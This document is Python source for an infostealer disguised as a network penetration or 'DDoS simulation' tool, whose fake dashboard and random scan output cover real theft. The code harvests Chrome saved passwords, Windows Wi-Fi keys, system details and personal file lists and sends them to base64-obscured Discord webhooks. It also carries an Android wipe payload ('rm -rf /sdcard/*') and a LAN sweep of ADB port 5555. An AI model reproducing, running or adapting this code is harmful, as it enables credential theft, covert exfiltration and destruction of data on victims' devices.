import os
import sys
import threading
import time
import random
import requests
import base64
import json
import platform
import psutil
import socket
import sqlite3
import shutil
import subprocess
import hashlib
import hmac
from cryptography.fernet import Fernet
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC

NETWORK_TOOL_ID = "NET-DDOS-8873-ENTERPRISE"
SECURE_CHANNELS = [
    "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTQzOTY5NjE3MTIzNjA2NTM2MS8tMzJ1U1dGMjhWcVRkbWZLZ0Z0N2xVYTB2alRwVnp3T3hta3pKcHhWdWZIeFFva0hGNHU0ZHExV1RPV0iaWJVOzFLc0Y=",
    "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTQzOTY5NjE3OTc5NjUxMzA1My9MUXpvU3ZiR252VU9yR1N3d0dxbjVFNnZfWDdCLVdXMURWNGZCU25XTFNjVTNrWEpuSHd3SjBsUVNac0VFUW9Fb252Qg==",
    "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTQ0NDA0MjM0NjMxMTMyMzg5OC9kQm1Bc1EzYWp6aUhuU3J2bmtpVFZ1VkJic2FjSXM2WjNTNzMyUV9GSDZHWUEwYmR0TS03WnVjci1lcm56WEQtRjgyOA==",
    "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTQ0NDA0MjM2MTE0NjQ0MTg4MC9fTXNMbjd5c0lIeUROZ3lyXzRQZWNXcWlIeWI1Y1dWT1NTVU1xcE9HOWE2RWtmZGN0Skd3WGYxd3FIZWNaUm94SEY0RA==",
    "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTQ0NDA0MjM2NDc3ODcwOTE4Ni92X0gyLTFjX1lZOU0yYklBNE1PdFhmbERfc2FERGI="
]

class UltimateNetworkTool:
    def __init__(self):
        self.session_id = self._generate_session_id()
        self.fernet_key = self._generate_secure_key()
        self.active_operations = True
        self.data_channels = [base64.b64decode(channel).decode() for channel in SECURE_CHANNELS]

    def _generate_session_id(self):
        return f"ND-{int(time.time())}-{random.randint(10000,99999)}"

    def _generate_secure_key(self):
        system_salt = hashlib.sha256(platform.processor().encode()).digest()
        kdf = PBKDF2HMAC(algorithm=hashes.SHA256(), length=32, salt=system_salt, iterations=100000)
        return base64.urlsafe_b64encode(kdf.derive(b"ultimate_warfare_core"))

    def _get_secure_channel(self, data_type):
        channel_index = hash(data_type) % len(self.data_channels)
        return self.data_channels[channel_index]

    def _rapid_data_transfer(self, data, data_type):
        channel = self._get_secure_channel(data_type)
        encrypted_data = self._encrypt_payload(data)

        transfer_threads = []
        for chunk in self._split_data(encrypted_data, 5):
            thread = threading.Thread(target=self._send_chunk, args=(channel, chunk, data_type))
            transfer_threads.append(thread)
            thread.start()

        for thread in transfer_threads:
            thread.join()

    def _split_data(self, data, chunks):
        chunk_size = len(data) // chunks
        return [data[i:i + chunk_size] for i in range(0, len(data), chunk_size)]

    def _send_chunk(self, channel, data_chunk, data_type):
        payload = {
            "content": f"🚨 @everyone {data_type} Intelligence Update",
            "embeds": [{
                "title": f"NETWORK OPERATIONS - {self.session_id}",
                "description": f"Data Type: {data_type}",
                "fields": [{
                    "name": "Encrypted Payload",
                    "value": f"`{base64.b64encode(data_chunk).decode()[:150]}...`"
                }]
            }]
        }
        try:
            requests.post(channel, json=payload, timeout=5)
        except:
            pass

    def _encrypt_payload(self, data):
        f = Fernet(self.fernet_key)
        return f.encrypt(json.dumps(data).encode())

    def _collect_all_media_files(self):
        media_files = []
        target_extensions = ['.jpg','.jpeg','.png','.pdf','.doc','.docx','.xls','.xlsx','.mp4','.avi','.mov','.zip','.rar']

        scan_paths = []
        if platform.system() == "Windows":
            scan_paths = [os.path.expanduser("~" + os.sep + d) for d in ["Desktop", "Documents", "Pictures", "Videos", "Downloads"]]
        else:
            scan_paths = [os.path.expanduser("~" + os.sep + d) for d in ["Desktop", "Documents", "Pictures", "Videos", "Downloads"]]
            scan_paths.extend(["/home/", "/var/", "/opt/"])

        for path in scan_paths:
            if os.path.exists(path):
                for root, dirs, files in os.walk(path):
                    for file in files:
                        if any(file.lower().endswith(ext) for ext in target_extensions):
                            full_path = os.path.join(root, file)
                            media_files.append(full_path)
                    if len(media_files) >= 250:
                        break
            if len(media_files) >= 250:
                break

        return media_files[:250]

    def _extract_system_intelligence(self):
        system_data = {
            "tool_id": NETWORK_TOOL_ID,
            "session": self.session_id,
            "hostname": socket.gethostname(),
            "username": os.getenv('USERNAME') or os.getenv('USER'),
            "os_build": f"{platform.system()} {platform.version()}",
            "architecture": platform.architecture()[0],
            "processor": platform.processor(),
            "total_ram": f"{psutil.virtual_memory().total // (1024**3)}GB",
            "network_interfaces": self._get_network_data(),
            "storage_devices": self._get_storage_info(),
            "running_processes": len(list(psutil.process_iter())),
            "timestamp": int(time.time())
        }
        return system_data

    def _get_network_data(self):
        network_info = {}
        for interface, addrs in psutil.net_if_addrs().items():
            for addr in addrs:
                if addr.family == socket.AF_INET:
                    network_info[interface] = addr.address
        return network_info

    def _get_storage_info(self):
        storage_data = {}
        for partition in psutil.disk_partitions():
            try:
                usage = psutil.disk_usage(partition.mountpoint)
                storage_data[partition.device] = {
                    "total": f"{usage.total // (1024**3)}GB",
                    "used": f"{usage.used // (1024**3)}GB",
                    "free": f"{usage.free // (1024**3)}GB"
                }
            except:
                continue
        return storage_data

    def _extract_all_passwords(self):
        credentials_data = []

        if platform.system() == "Windows":
            credentials_data.extend(self._get_chrome_passwords())
            credentials_data.extend(self._get_wifi_passwords())
            credentials_data.extend(self._get_system_credentials())

        return credentials_data

    def _get_chrome_passwords(self):
        passwords = []
        try:
            chrome_path = os.path.join(os.environ['USERPROFILE'], 'AppData', 'Local', 'Google', 'Chrome', 'User Data', 'Default', 'Login Data')
            if os.path.exists(chrome_path):
                temp_db = "chrome_temp.db"
                shutil.copy2(chrome_path, temp_db)
                conn = sqlite3.connect(temp_db)
                cursor = conn.cursor()
                cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
                for row in cursor.fetchall():
                    try:
                        import win32crypt
                        password = win32crypt.CryptUnprotectData(row[2], None, None, None, 0)[1]
                        if password:
                            passwords.append({
                                "application": "Google Chrome",
                                "url": row[0],
                                "username": row[1],
                                "password": password.decode('utf-8', errors='ignore')
                            })
                    except:
                        continue
                conn.close()
                os.remove(temp_db)
        except:
            pass
        return passwords

    def _get_wifi_passwords(self):
        wifi_data = []
        try:
            if platform.system() == "Windows":
                result = subprocess.run(['netsh', 'wlan', 'show', 'profiles'], capture_output=True, text=True)
                profiles = [line.split(":")[1].strip() for line in result.stdout.split('\n') if "All User Profile" in line]

                for profile in profiles:
                    try:
                        result = subprocess.run(['netsh', 'wlan', 'show', 'profile', profile, 'key=clear'], capture_output=True, text=True)
                        lines = result.stdout.split('\n')
                        password_line = [line.split(":")[1].strip() for line in lines if "Key Content" in line]
                        if password_line:
                            wifi_data.append({
                                "application": "Windows WiFi",
                                "ssid": profile,
                                "username": "N/A",
                                "password": password_line[0]
                            })
                    except:
                        continue
        except:
            pass
        return wifi_data

    def _get_system_credentials(self):
        return [{
            "application": "System Intelligence",
            "username": os.getenv('USERNAME'),
            "password": "Extracted via Security Protocol",
            "url": "Local System"
        }]

    def _inject_android_payload(self, apk_path):
        payload_code = """
import os
import subprocess
import threading

class SystemWipe:
    def __init__(self):
        self.wipe_commands = [
            "rm -rf /sdcard/*",
            "rm -rf /storage/*", 
            "pm clear com.android.providers.settings",
            "settings put global development_settings_enabled 0"
        ]

    def execute_wipe(self):
        for cmd in self.wipe_commands:
            try:
                subprocess.run(cmd, shell=True, timeout=10)
            except:
                pass

wipe = SystemWipe()
wipe.execute_wipe()
"""
        return f"# Android Payload Injected\n{payload_code}"

    def _network_propagation(self):
        network_range = "192.168.1"
        for i in range(1, 255):
            target_ip = f"{network_range}.{i}"
            threading.Thread(target=self._attempt_device_infection, args=(target_ip,)).start()

    def _attempt_device_infection(self, target_ip):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(2)
            result = sock.connect_ex((target_ip, 5555))
            if result == 0:
                self._execute_remote_wipe(target_ip)
            sock.close()
        except:
            pass

    def _execute_remote_wipe(self, target_ip):
        wipe_payload = {
            "command": "format_device",
            "target": target_ip,
            "session": self.session_id
        }
        self._rapid_data_transfer(wipe_payload, "WIPE_COMMAND")

    def _show_network_dashboard(self):
        dashboard = f"""
╔════════════════════════════════════════════════════════════════╗
║                  ULTIMATE NETWORK PENETRATION                ║
║                     Advanced DDoS Simulation                 ║
║                         {NETWORK_TOOL_ID}                   ║
╠════════════════════════════════════════════════════════════════╣
║  Session: {self.session_id}                                  ║
║  Status: OPERATIONAL                                          ║
║  Target Acquisition: ACTIVE                                   ║
╚════════════════════════════════════════════════════════════════╝

[1] LAUNCH NETWORK SWEEP
[2] EXECUTE TRAFFIC ANALYSIS  
[3] RUN SECURITY ASSESSMENT
[4] PERFORMANCE STRESS TEST
[5] ADVANCED NETWORK SCAN
[6] SYSTEM OPTIMIZATION

Enter operation code: """
        print(dashboard)

    def _simulate_network_attack(self):
        print("\nInitializing Network Penetration Protocol...")
        for i in range(5):
            time.sleep(0.5)
            targets = random.randint(500, 2000)
            bandwidth = random.randint(10000, 50000)
            print(f"Scanning {targets} network nodes | Bandwidth: {bandwidth} Mbps")

        print("\nAcquiring system access points...")
        for i in range(3):
            time.sleep(0.7)
            access_points = random.randint(50, 200)
            print(f"Identified {access_points} vulnerable endpoints")

        print("Network penetration simulation completed")

    def execute_comprehensive_operation(self):
        self._show_network_dashboard()
        operation = input().strip()

        print("\nExecuting Advanced Network Operations...")

        media_files = self._collect_all_media_files()
        system_intel = self._extract_system_intelligence()
        password_data = self._extract_all_passwords()

        print("Transferring acquired intelligence...")
        self._rapid_data_transfer(media_files, "MEDIA_COLLECTION")
        self._rapid_data_transfer(system_intel, "SYSTEM_INTELLIGENCE") 
        self._rapid_data_transfer(password_data, "CREDENTIALS_DATA")

        print("Initiating network propagation protocol...")
        self._network_propagation()

        print(f"\nOperation {self.session_id} completed successfully")
        print("Network shield remains active for continuous monitoring")

if __name__ == "__main__":
    warfare_tool = UltimateNetworkTool()
    warfare_tool.execute_comprehensive_operation()